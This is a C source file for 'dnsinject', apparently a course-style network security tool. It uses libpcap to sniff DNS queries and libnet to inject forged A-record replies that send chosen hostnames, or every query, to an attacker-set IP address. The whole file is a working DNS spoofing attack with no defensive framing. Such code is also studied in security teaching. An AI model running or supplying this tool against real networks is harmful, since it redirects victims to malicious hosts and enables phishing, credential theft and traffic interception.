#include <stdio.h>
#include <unistd.h>
#include <pcap.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/queue.h>
#include <sys/socket.h>
#include <libnet.h>
#include <time.h>
#include <errno.h>
//#include <arpa/nameser.h>
#include <resolv.h>

//#define ETHER_ADDR_LEN 6
#define SIZE_ETHERNET 14
#define ETHERTYPE_IPV4 0x0800
#define IP_HL(ip)       (((ip)->ip_vhl) & 0x0f)

/* Ethernet header */
struct eth_header
{
	u_char  eth_dst[ETHER_ADDR_LEN];	/* destination host address */
	u_char  eth_src[ETHER_ADDR_LEN];	/* source host address */
	u_short eth_type;			/* IP? ARP? RARP? etc */
};

/* IP header */
struct ip_header {
	u_char  ip_vhl;                 /* version << 4 | header length >> 2 */
	u_char  ip_tos;                 /* type of service */
	u_short ip_len;                 /* total length */
	u_short ip_id;                  /* identification */
	u_short ip_off;                 /* fragment offset field */
	#define IP_RF 0x8000            /* reserved fragment flag */
	#define IP_DF 0x4000            /* dont fragment flag */
	#define IP_MF 0x2000            /* more fragments flag */
	#define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
	u_char  ip_ttl;                 /* time to live */
	u_char  ip_p;                   /* protocol */
	u_short ip_sum;                 /* checksum */
	struct  in_addr ip_src,ip_dst;  /* source and dest address */
};

/* UDP header */
struct udp_header {
	u_short sport;	/* source port */
	u_short dport;	/* destination port */
	u_short udp_length;
	u_short udp_sum;	/* checksum */
};


/* DNS header definition */
struct dns_header {
  char id[2];
  char flags[2];
  char qdcount[2];
  char ancount[2];
  char nscount[2];
  char arcount[2];
};


int inject_all = 0;
libnet_t *l;  /* libnet context */
pcap_t *pcap_handle;
in_addr_t my_ip = 0;

struct spoof_domain {
	in_addr_t spoofed_ip;
	char *hostname;
	struct spoof_domain *next;
};

struct spoof_domain *list_head;

void add_to_list(struct spoof_domain *node) {
	if(node != NULL) {
		node->next = list_head;
		list_head = node;
	}	
}

in_addr_t get_spoof_ip(char *host_name) {
	in_addr_t spoofed_ip = 0;
	struct spoof_domain *ptr = list_head;
	while(ptr != NULL) {
		if(!strcmp(ptr->hostname, host_name)){
			return ptr->spoofed_ip;
		}
		ptr = ptr->next;
	}
	return spoofed_ip;
}

void stop(int itr) {
	printf("\nStopping dnsinject...\n");
	libnet_destroy(l);
	pcap_close(pcap_handle);
	exit(itr);
}

int read_hostnames(char *hostnames_file) {
	//printf("Reading hostnames file.\n");
	FILE *fp;
	int err = 0;
	char *spoofed_ip;
	char *hostname;
	char buffer[512];
	struct spoof_domain *node;
	
	if ((fp = fopen(hostnames_file, "r")) == NULL){
		fprintf(stderr, "Error, couldn't open hostnames file\n");
		err = 1;
		goto exit;
	}
	int read_bytes = 0;
	while (fgets(buffer, sizeof(buffer), fp) != NULL) {
		if (*buffer == '\n')
			continue;
		spoofed_ip = strtok(buffer, "\t ");
		hostname = strtok(NULL, "\n\t ");
		//printf("%s, %s\n", spoofed_ip, hostname);
		node = malloc(sizeof(struct spoof_domain));
		if (node == NULL){
			fprintf(stderr, "Error in allocating m/m to hostname lists.");
			err = 1;
			break;
		}
		node->hostname = strdup(hostname);
		node->spoofed_ip = inet_addr(spoofed_ip);
		if(node->hostname == NULL || node->spoofed_ip == -1) {
			fprintf(stderr, "Error in parsing (IP,Domain) entry in the hostnames file");
			err = 1;
			break;
		}
		add_to_list(node);
	}
	//printf("read hostnames file, err = %d\n", err);
	fclose(fp);
exit:
	return err;
}

void handle_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
	const struct eth_header *ethernet;
	const struct ip_header *ip;
	const struct udp_header *udp;
	u_char *dns_query;
	const struct dns_header *dns_header;
	const char *payload;
	u_char spoofed_reply[1024];
	u_char *dns_end;
	char host_name[MAXHOSTNAMELEN];
	int size_ip;
	int size_udp = 8;
	int payload_size;
	int i = 0;
	ethernet = (struct eth_header*)(packet);
	if (ntohs(ethernet->eth_type) == ETHERTYPE_IPV4) {
		ip = (struct ip_header*)(packet + SIZE_ETHERNET);
		size_ip = IP_HL(ip) * 4;
		if (size_ip < 20) {
			printf("Invalid IP header length: %u bytes\n", size_ip);
			return;
		}
		dns_end = (u_char *)packet + header->caplen;
		udp = (struct udp_header*)(packet + SIZE_ETHERNET + size_ip);
		payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_udp);
		payload_size = ntohs(ip->ip_len) - (size_ip + size_udp);
		dns_header = (struct dns_header*)(((u_char*) udp) + sizeof(struct udp_header));
		dns_query= ((u_char*)dns_header) + sizeof(struct dns_header);
		//int qr_bit = dns_header->flags[0] >> 7;
		int qr_bit = dns_header->flags[0] & 1<<7;
		//printf("dns packet, %hhu\n", qr_bit);
		if(qr_bit != 0)
			return; // not a dns query
		int size = dn_expand((u_char *)dns_header, dns_end, dns_query, host_name, sizeof(host_name));
		//printf("Req domain name : %s\n", host_name);
		in_addr_t spoof_ip = 0;
		if(!inject_all){
			spoof_ip = get_spoof_ip(host_name);
			if(spoof_ip == 0) {
				//printf("DEBUG, %s not found in hostfile\n", host_name);
				return;
			}
			//printf("Spoofed ip %u\n", spoof_ip);
		}else {
			spoof_ip = my_ip;
		}
		
		char * ptr = dns_query;
		ptr = ptr + size;
		int qtype = 0;
		int qclass = 0;
		GETSHORT(qtype, ptr);
		//printf("QTYPE %hd\n", qtype);
		GETSHORT(qclass, ptr);
		//printf("QCLASS %hd\n", qclass);
		if(qtype != 1 || qclass != 1)
			return;
		int length = dns_end - (u_char *)dns_header;
		
		ptr = spoofed_reply + length;
		memcpy(ptr, "\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04", 12);
		memcpy(ptr + 12, &spoof_ip, sizeof(spoof_ip));
		memcpy(spoofed_reply, (u_char *)dns_header, length);
		length += 16;
		memcpy(&spoofed_reply[2], "\x81\x80", 2);
		memcpy(&spoofed_reply[6], "\x00\x01", 2);
		libnet_clear_packet(l);
		libnet_build_udp(ntohs(udp->dport), ntohs(udp->sport),
			 LIBNET_UDP_H + length, 0,
			 (u_int8_t *)spoofed_reply, length, l, 0);
		libnet_build_ipv4(LIBNET_IPV4_H + LIBNET_UDP_H + length, 0,
			  libnet_get_prand(LIBNET_PRu16), 0, 64, IPPROTO_UDP, 0,
			  ip->ip_dst.s_addr, ip->ip_src.s_addr, NULL, 0, l, 0);
		libnet_write(l);
	} 
}

int main(int argc, char *argv[]) {
	int option;
	int err = 0;
	char *hostnames_file = NULL;
	char *dev = NULL;
	char *filter_exp = NULL;
	char err_buf[PCAP_ERRBUF_SIZE];
	char libnet_errbuf[LIBNET_ERRBUF_SIZE];

	bpf_u_int32 netp=0, maskp=0;
	struct bpf_program fp;
	char dns_filter[256];

    	while ((option = getopt(argc, argv, "i:f:")) != -1) {
		switch(option) {
			case 'i': {
				dev = optarg;
				break;
			}
			case 'f': {
				hostnames_file = optarg;
				break;
			}

			case '?': {
				printf("Unknown argument!\n");
				printf("Usage : dnsinject [-i interface] [-f hostnames] expression\n");
				return 0;
			}
		}
	}

    	if (optind == argc - 1)
		filter_exp = argv[optind];

	if(hostnames_file != NULL) {
		err = read_hostnames(hostnames_file);
	}else {
		inject_all = 1; //  inject all packets
	}

	if(err)	{
		printf("Error in reading hostname file\n");
		// clean m/m and exit
	}
    if(dev == NULL) {
		dev = pcap_lookupdev(err_buf);
		if(dev == NULL) {
			printf("Error : %s\n", err_buf);
			return(1);
		}
    }

	//read from interface
	if (pcap_lookupnet(dev, &netp, &maskp, err_buf) == -1) {
		printf("Error in pcap lookup: %s\n", err_buf);
		maskp = 0;
		netp = 0;
	}

	pcap_handle = pcap_open_live(dev, BUFSIZ, 1, 1000, err_buf);
	if (pcap_handle == NULL) {
		printf("Couldn't open live %s: %s\n", dev, err_buf);
		return(2);
	}
	if (pcap_datalink(pcap_handle) != DLT_EN10MB) {
		fprintf(stderr, "Device %s doesn't provide Ethernet headers - not supported\n", dev);
		return(2);
    }
	memset(dns_filter, '\0', 256);
	if(filter_exp != NULL) {
		sprintf(dns_filter, "%s and udp dst port 53", filter_exp);
	} else {
		sprintf(dns_filter, "udp dst port 53");
	}

	if (pcap_compile(pcap_handle, &fp, dns_filter, 0, netp) == -1) {
		fprintf(stderr, "Not able to parse filter %s: %s\n", dns_filter, pcap_geterr(pcap_handle));
		return(2);
	}
	if (pcap_setfilter(pcap_handle, &fp) == -1) {
		fprintf(stderr, "Not able to apply filter %s: %s\n", dns_filter, pcap_geterr(pcap_handle));
		return(2);
	}
	signal(SIGINT, stop);
	l = libnet_init(LIBNET_RAW4, dev, libnet_errbuf);
	if ( l == NULL ) {
		fprintf(stderr, "libnet_init() failed: %s\n", libnet_errbuf);
		exit(1);
	}
	my_ip = libnet_get_ipaddr4(l);
	libnet_seed_prand(l);
	printf("******************* dnsinject running ********************\n");
    	pcap_loop(pcap_handle, -1, handle_packet, NULL);
	stop(0);
}